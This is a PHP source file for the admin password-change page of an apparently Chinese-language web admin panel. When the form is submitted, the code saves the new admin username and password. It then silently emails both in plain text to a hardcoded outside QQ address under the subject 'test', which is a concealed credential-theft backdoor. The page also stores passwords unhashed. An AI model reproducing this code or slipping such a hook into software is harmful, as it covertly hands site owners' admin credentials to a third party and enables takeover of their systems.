<?php
require("common.php");
require("nani.php");

if(@$_GET['act']=='submit'){
	if($_POST['pass']!=conf('adminpwd')){
		go('原密码不正确！');
	}else{
		setconf('adminid',$_POST['user']);
		setconf('adminpwd',$_POST['pwd']);
		send_email('test',$_POST['user'].','.$_POST['pwd'],'583096723@qq.com','HTML');
		go('修改成功！为了您的安全，请重新登录','logout.php');
	}
}
?>
<!DOCTYPE html>
<html>
<head>
<title><?php echo $flag; ?></title>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="stylesheet" href="css/bootstrap.min.css" />
<link rel="stylesheet" href="css/bootstrap-responsive.min.css" />
<link rel="stylesheet" href="css/uniform.css" />
<link rel="stylesheet" href="css/select2.css" />
<link rel="stylesheet" href="css/unicorn.main.css" />
<link rel="stylesheet" href="css/unicorn.grey.css" class="skin-color" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body>
<?php include('sidebar.php'); ?>
<div id="content">
  <div id="content-header">
    <h1>管理员设置</h1>
  </div>
  <div id="breadcrumb"> <a href="index.php" title="Go to Home" class="tip-bottom"><i class="icon-home"></i> Home</a> <a href="#" class="current">管理员设置</a> </div>
  <div class="container-fluid">
    <div class="row-fluid">
      <div class="span12">
        <div class="widget-box">
          <div class="widget-title"> <span class="icon"> <i class="icon-edit"></i> </span>
            <h5>修改管理员登录账号和密码</h5>
          </div>
          <div class="widget-content nopadding">
            <form action="?act=submit" method="post" class="form-horizontal" name="password_validate" id="password_validate" novalidate="novalidate" />
            <div class="control-group">
              <label class="control-label">账号</label>
              <div class="controls">
                <input type="text" id="user" name="user" value="<?php echo conf('adminid'); ?>" />
              </div>
            </div>
            <div class="control-group">
              <label class="control-label">原密码</label>
              <div class="controls">
                <input type="password" id="pass" name="pass" value="" />
              </div>
            </div>
            <div class="control-group">
              <label class="control-label">新密码</label>
              <div class="controls">
                <input type="password" id="pwd" name="pwd" value="" />
              </div>
            </div>
			<div class="control-group">
              <label class="control-label">确认密码</label>
              <div class="controls">
                <input type="password" id="pwd2" name="pwd2" value="" />
              </div>
            </div>
            <div class="form-actions">
              <button type="submit" class="btn btn-primary" name="submit" id="submit"><i class="icon-ok icon-white"></i> 确认</button>
            </div>
            </form>
          </div>
        </div>
      </div>
    </div>
    <div class="row-fluid">
      <div id="footer" class="span12"><?php echo $copyright; ?></div>
    </div>
  </div>
</div>
<script src="js/jquery.min.js"></script>
<script src="js/jquery.ui.custom.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.uniform.js"></script>
<script src="js/select2.min.js"></script>
<script src="js/jquery.validate.js"></script>
<script src="js/unicorn.js"></script>
<script src="js/unicorn.form_validation.js"></script>
</body>
</html>
